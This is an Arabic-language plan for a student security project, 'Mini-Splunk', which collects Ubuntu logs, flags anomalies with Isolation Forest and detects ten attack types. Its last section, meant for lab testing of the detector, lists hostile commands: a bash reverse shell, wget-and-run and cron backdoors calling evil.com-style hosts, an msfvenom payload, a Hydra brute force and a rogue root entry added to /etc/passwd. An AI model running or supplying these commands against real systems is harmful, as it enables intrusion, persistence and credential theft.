# ✅ خطة عمل مشروع "Mini-Splunk"

## 1. 🎯 الفكرة الأساسية

أداة خفيفة تعمل على جمع وتحليل وعرض سجلات الأمان من أنظمة مثل Ubuntu، مع استخدام الذكاء الاصطناعي للكشف عن الشذوذ (anomalies) والتعامل مع تهديدات الأمن السيبراني بطريقة ذكية، كل ذلك من خلال واجهة رسومية بسيطة.

---

## 2. ⚙️ مكونات المشروع

| العنصر | الأدوات والتقنيات المقترحة | الوظيفة |
|--------|---------------------------|---------|
| نظام التشغيل | Ubuntu 22.04 | مصدر السجلات |
| جمع السجلات | Python (باستخدام Paramiko أو rsyslog) | نقل السجلات |
| التحليل الأولي | Python + Pandas أو Logstash | تنقية وتنظيم السجلات |
| التخزين | SQLite أو Elasticsearch | تخزين واسترجاع سريع |
| الذكاء الاصطناعي | Isolation Forest أو AutoEncoder | كشف الشذوذ |
| مصادر تهديد | MISP / VirusTotal / OTX API | إثراء البيانات بذكاء |
| الواجهة الرسومية | Streamlit أو Electron + React | عرض الرسوم والتقارير |
| التنبيهات | بريد إلكتروني / Slack | تحذيرات لحظية عند الشذوذ |
| التقارير | PDF/CSV (ReportLab أو Pandas) | توثيق للنتائج |

---

## 3. 🧠 الجانب النظري

### ETL Pipeline:
- **Extract**: جلب السجلات من السيرفر (SSH أو rsyslog)
- **Transform**: تنظيفها وتحويلها (normalize + parse)
- **Load**: تخزينها في قاعدة بيانات قابلة للاستعلام

### كشف الشذوذ بالذكاء الاصطناعي:
تدريب نموذج Isolation Forest على سمات مثل:
- عدد المحاولات الفاشلة لكل IP
- الوقت بين المحاولات
- مصدر IP
- نوع العملية (login, sudo, etc.)

### Threat Intelligence:
مطابقة IP أو Hash أو Domains مع قواعد بيانات التهديد لتحديد الخطر الفعلي.

---

## 4. 🚀 خطة التنفيذ العملية

| المرحلة | الخطوات بالتفصيل |
|---------|------------------|
| 1. الإعداد | إعداد Ubuntu وفتح الـ SSH وجمع بعض سجلات /var/log/auth.log |
| 2. النقل والتحليل | سكربت Python يقوم بقراءة وتحليل السجلات محليًا أو عن بُعد |
| 3. التخزين | إنشاء قاعدة SQLite أو Elasticsearch بسيطة لتخزين السجلات |
| 4. الذكاء الاصطناعي | تدريب Isolation Forest على بيانات تاريخية لاكتشاف الشذوذ |
| 5. الواجهة | واجهة React أو Streamlit تعرض: المخاطر، الشذوذ، مصدر IP، التوصيات |
| 6. التقارير والتنبيهات | توليد PDF تلقائي لكل أسبوع، مع تنبيه فوري في حال اكتشاف هجوم |
| 7. اختبار المشروع | تجربة عدة أنواع من الهجمات (Brute Force, SSH abuse...) ورصدها |

---

## 5. 💡 إضافات اختيارية بدون تعقيد

| الإضافة | الفائدة |
|---------|---------|
| خريطة جغرافية للمهاجمين | عرض مواقع الـ IPs المشبوهة |
| دعم الوضع الليلي | واجهة مريحة |
| زر "تحليل يدوي" | لتحليل سجل معين عند الطلب |
| دعم تعدد المستخدمين | إضافة بسيطة عبر JWT أو Firebase لاحقًا |

---

## 6. 🎓 العرض الأكاديمي للدكتور

- **مقدمة مبسطة عن المشكلة**: صعوبة تحليل السجلات يدويًا
- **لماذا هذا المشروع مهم؟**: لأنه يحاكي أدوات كبيرة مثل Splunk لكن بموارد أقل وذكاء اصطناعي
- **عرض الأدوات المستخدمة**: جدول احترافي منظم
- **شرح النظري**: ETL + AI + Threat Feeds
- **شاشات الواجهة (Screenshots)**: رسوم بيانية + تنبيهات + تقارير
- **خاتمة واقتراحات مستقبلية**: ربط بواجهات SIEM أو دعم مزيد من اللوجات

---

## ✅ ملخص نهائي

- المشروع يحاكي Splunk لكنه مبسط ومخصص للتعلم والتطبيق العملي
- يجمع بين: جمع السجلات، الذكاء الاصطناعي، واجهة رسومية، وتقارير
- مناسب للعرض الأكاديمي لأنه يغطي مفاهيم متعددة وحديثة في الأمن السيبراني
- خطة تنفيذية منظمة، يمكنك تنفيذها تدريجيًا وقياس التقدم

---

# 🛡️ أنواع الهجمات التي يمكن اكتشافها في مشروع "Mini-Splunk"

## ✅ 1. Brute-force Attack على SSH

- **الوصف**: محاولة تسجيل الدخول مرات متعددة باستخدام كلمات مرور خاطئة
- **الدليل في السجلات**:
  ```
  Failed password for invalid user from 192.168.x.x port 22
  ```
- **آلية الاكتشاف**: كثافة عالية لمحاولات الدخول الفاشلة خلال فترة قصيرة

## ✅ 2. Login from Suspicious IP (Geo Anomaly)

- **الوصف**: دخول ناجح من عنوان IP خارج الدولة المعتادة
- **الدليل في السجلات**:
  ```
  Accepted password for user from <IP> port 22
  ```
- **آلية الاكتشاف**: مقارنة الدولة باستخدام GeoIP + مقارنة بالسجلات التاريخية

## ✅ 3. Privilege Escalation Attempts (sudo abuse)

- **الوصف**: محاولات متكررة لاستخدام sudo أو su للدخول كمستخدم جذر
- **الدليل في السجلات**:
  ```
  user NOT in sudoers
  ```
- **آلية الاكتشاف**: عدد محاولات استخدام sudo المرتفعة + فشل متكرر

## ✅ 4. Creation of Suspicious Users

- **الوصف**: إنشاء حساب مستخدم جديد بدون مبرر
- **الدليل في السجلات**:
  ```
  new user: name=test, UID=1001, GID=1001
  ```
- **آلية الاكتشاف**: مقارنة مع baseline أو أحداث غير اعتيادية في إدارة النظام

## ✅ 5. Port Scanning Detection

- **الوصف**: فحص شامل للمنافذ باستخدام أدوات مثل Nmap من جهاز خارجي
- **السجل في النظام**: لا يظهر مباشرة، لكن:
  - ارتفاع عدد الاتصالات غير الناجحة
  - سجل جدار الحماية (iptables أو ufw) يُظهر اتصال من نفس IP على منافذ متعددة

## ✅ 6. Malicious File Execution

- **الوصف**: تشغيل ملف بايناري غريب أو سكربت غير مألوف
- **السجلات المحتملة**: `/var/log/syslog` أو `auditd logs`
- **آلية الاكتشاف**: تنفيذ عمليات على ملفات غير معتادة في `/tmp` أو `/home`

## ✅ 7. Scheduled Persistence via Cron (Cronjob Attack)

- **الوصف**: إضافة وظيفة cron خبيثة
- **الدليل في السجلات**:
  ```
  (root) CMD (/tmp/.malware.sh)
  ```
- **آلية الاكتشاف**: نشاط cron غير معتاد + أمر يشير لملف غريب

## ✅ 8. DNS Tunneling / Suspicious Domains

- **الوصف**: الاتصال بدومينات مشبوهة لنقل بيانات سرًا
- **الدليل**:
  - سجلات DNS (إذا كانت متاحة)
  - ملفات `/var/log/syslog` أو أي محلل شبكة (لو متاح)
- **آلية الاكتشاف**: مقارنة الدومينات مع مصادر Threat Intelligence APIs مثل VirusTotal أو OTX

## ✅ 9. Reverse Shell Attempt

- **الوصف**: الضحية يفتح اتصال صادر باتجاه جهاز المهاجم
- **الدليل**:
  - ظهور اتصال bash نحو عنوان خارجي
  - netstat أو lsof قد تكشف عن اتصالات مشبوهة

## ✅ 10. File Integrity Violations

- **الوصف**: تغيير غير مبرر في ملفات مهمة مثل `/etc/passwd` أو `/etc/shadow`
- **آلية الاكتشاف**: عبر مراقبة hash الملفات أو سجلات auditd

---

## 🧪 ملاحظة مهمة عند الاختبار

- يجب تمكين سجلات `auditd` + `ufw` + `auth.log` + `cron` + `bash history`
- يمكن محاكاة الهجمات على جهاز اختباري وهمي باستخدام أدوات مثل:
  - **Hydra** (Brute-force)
  - **Nmap** (Scanning)
  - **Metasploit** (Exploit + Reverse Shell)

---

## 📌 ملخص النقاط

| نوع الهجوم | يكتشفه المشروع؟ | طريقة الاكتشاف |
|------------|-----------------|-----------------|
| Brute-force SSH | ✅ | auth.log (محاولات فاشلة) |
| تسجيل دخول من IP مشبوه | ✅ | مقارنة IP مع الدولة |
| Escalation باستخدام sudo | ✅ | سطر sudo في auth.log |
| إنشاء مستخدم جديد | ✅ | system log أو auditd |
| فحص المنافذ | ⚠️ جزئيًا | عبر firewall logs |
| تنفيذ ملف مشبوه | ✅ | system log أو auditd |
| Cronjob خبيث | ✅ | cron log |
| الاتصال بدومينات خطيرة | ✅ | عبر Threat Intel |
| Reverse Shell | ✅ | مراقبة الاتصالات الصادرة |
| تعديل ملفات حساسة | ✅ | auditd أو فحص Hash |

---

# 🔰 أولًا: الهجمات التي يمكن اكتشافها عبر سجلات النظام:

1. محاولات تسجيل دخول فاشلة كثيرة (Brute Force)
2. الدخول باستخدام root من IP غير معروف
3. محاولة تنفيذ أوامر بصلاحيات sudo غير مصرح بها
4. الاتصال عبر SSH من مواقع غريبة أو مجهولة
5. تنفيذ reverse shell
6. تحميل ملفات ضارة عبر wget أو curl
7. محاولة تعديل ملفات النظام الحساسة (مثل `/etc/passwd`)
8. تنفيذ بايلودات Metasploit (Meterpreter)
9. عمليات port scanning من أجهزة داخل الشبكة
10. اتصالات خارجية إلى عناوين IP مشبوهة أو محظورة

---

# 🧰 ثانيًا: السكربتات (كل سكربت يمثل هجمة)

## 🔹 1. Brute Force SSH باستخدام Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

## 🔹 2. Reverse Shell بسيط (bash)
```bash
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

## 🔹 3. تحميل وتشغيل ملف مشبوه
```bash
wget http://malicious-domain.com/backdoor.sh -O /tmp/x && bash /tmp/x
```

## 🔹 4. تنفيذ أوامر بصلاحيات غير مصرح بها
```bash
sudo cat /etc/shadow
```

## 🔹 5. تشغيل nmap داخل الشبكة (كشف نشاط مشبوه)
```bash
nmap -sS 192.168.1.0/24
```

## 🔹 6. تسجيل دخول متكرر فاشل (بايثون)
```python
import paramiko
ip = "target_ip"
for i in range(10):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username="root", password="wrongpass")
    except:
        pass
```

## 🔹 7. Meterpreter Payload (باستخدام msfvenom)
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
```

## 🔹 8. إدخال cronjob خبيث (backdoor)
```bash
echo "* * * * * root /bin/bash -c 'wget http://evil.com/x.sh -O - | sh'" >> /etc/crontab
```

## 🔹 9. محاولة تعديل /etc/passwd
```bash
echo 'maluser:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## 🔹 10. DNS tunneling أو اتصال لخادم مشبوه
```bash
dig @8.8.8.8 evil-command.example.com
```
